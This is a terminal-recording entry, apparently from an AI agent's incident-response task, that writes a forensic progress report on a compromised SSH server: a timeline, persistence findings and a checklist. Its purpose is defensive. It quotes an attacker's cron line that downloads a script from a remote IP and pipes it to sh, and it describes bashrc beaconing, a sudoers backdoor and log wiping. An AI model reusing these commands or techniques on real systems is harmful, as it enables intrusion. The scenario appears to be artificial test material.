[224.334989, "i", "cat << 'EOF' > /app/progress.md\n# Incident Investigation Progress & Timeline Report\n\n## Investigation Overview\n- **Target Host**: `ssh-prod-01` (`CentOS 7`)\n- **Analyst Workstation**: Investigation conducted from analysis machine via mounted disk image at `/disk` and security telemetry at `/sas`.\n- **Primary Objectives**: Identify the full attack lifecycle, enumerate all persistence mechanisms (alerted and silent), determine entry vector and root cause, evaluate baseline weaknesses, and formulate a verifiable remediation plan.\n\n## Chronological Incident Timeline\n- **2026-08-15 00:53:24 - 00:54:52 UTC**: External attacker originating from IP `198.51.100.78` launched an SSH credential brute-force attack against the `root` account via port 22. Evidence: `/disk/var/log/secure`.\n- **2026-08-15 00:54:55 UTC**: Attacker successfully authenticated as `root` via password authentication (`Accepted password for root from 198.51.100.78 port 51900 ssh2`). Evidence: `/disk/var/log/secure`.\n- **2026-08-15 ~01:00 UTC**: Attacker dropped and executed the cryptominer binary at `/disk/tmp/.X11-unix/.xorg` (SHA256: `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253`). Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).\n- **2026-08-15 ~01:10 UTC**: Attacker established persistence mechanism #1 via Cron at `/disk/var/spool/cron/root` scheduled every minute (`* * * * * root curl hxxp://198.51.100.78/x | sh`). Evidence: `/disk/var/spool/cron/root`, `/sas/alerts.json` (`ALERT-05`).\n- **2026-08-15 ~01:15 UTC**: Attacker established persistence mechanism #2 via systemd service at `/disk/etc/systemd/system/system-update-helper.service`. Evidence: `/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json` (`ALERT-06`).\n- **2026-08-15 ~01:20 UTC**: Attacker planted silent persistence mechanism #3 via shell startup file `/disk/root/.bashrc` using `PROMPT_COMMAND` beaconing to `198.51.100.78`. Evidence: `/disk/root/.bashrc`.\n- **2026-08-15 ~01:30 UTC**: Attacker planted a NOPASSWD sudo backdoor for user `devops` at `/disk/etc/sudoers.d/devops`. Evidence: `/disk/etc/sudoers.d/devops`.\n- **2026-08-15 ~02:00 UTC**: Attacker leveraged `devops` account to execute internal SSH hydra brute-force pivoting against internal network targets. Evidence: `/disk/home/devops/.bash_history`.\n- **2026-08-15 03:03:00 UTC**: Attacker executed anti-forensic log clearing, wiping 15 authentication log lines. Evidence: `/disk/var/log/secure` (`--- 15 authentication lines cleared here (T1070.002 log tampering) ---`).\n- **2026-08-15 03:20 UTC**: EDR high-severity alert cluster fired and incident intake ticket opened. Evidence: `/sas/handoff/intake.pdf`.\n\n## Working Investigation Checklist\n- [x] Mount and inspect `/disk` forensic copy in read-only mode (`/disk`)\n- [x] Review security alerts feed (`/sas/alerts.json`)\n- [x] Review baseline compliance feed (`/sas/baseline.json`)\n- [x] Review vulnerability scan results (`/sas/vulns.json`)\n- [x] Review Threat Intelligence Advisory and CTI materials (`/sas/cti/advisory.txt`, `/sas/cti/advisory.pdf`)\n- [x] Analyze authentication logs (`/disk/var/log/secure`, `/disk/var/log/secure.1.gz`, `/disk/var/log/wtmp.csv`)\n- [x] Inspect dropped binary and compute SHA256 hash (`/disk/tmp/.X11-unix/.xorg`)\n- [x] Inspect user accounts, shadow, and sudoers configurations (`/disk/etc/passwd`, `/disk/etc/sudoers.d/devops`)\n- [x] Inspect shell history files across all user accounts (`/disk/home/devops/.bash_history`, `/disk/root/.bashrc`)\n- [x] Inspect cron scheduled tasks (`/disk/var/spool/cron/root`, `/disk/etc/crontab`)\n- [x] Inspect systemd persistence units (`/disk/etc/systemd/system/system-update-helper.service`)\n- [x] Verify presence/absence of CVE exploits (`/sas/vulns.json`)\n- [x] Reconcile pre-filled change ticket `CHG-3182` in place (`/sas/handoff/change-ticket.md`)\n- [x] Produce required reports under `/app/` (`/app/progress.md`, `/app/intrusion-report.md`, `/app/vuln-report.md`, `/app/baseline-report.md`, `/app/remediation-plan.md`)\nEOF\n"]
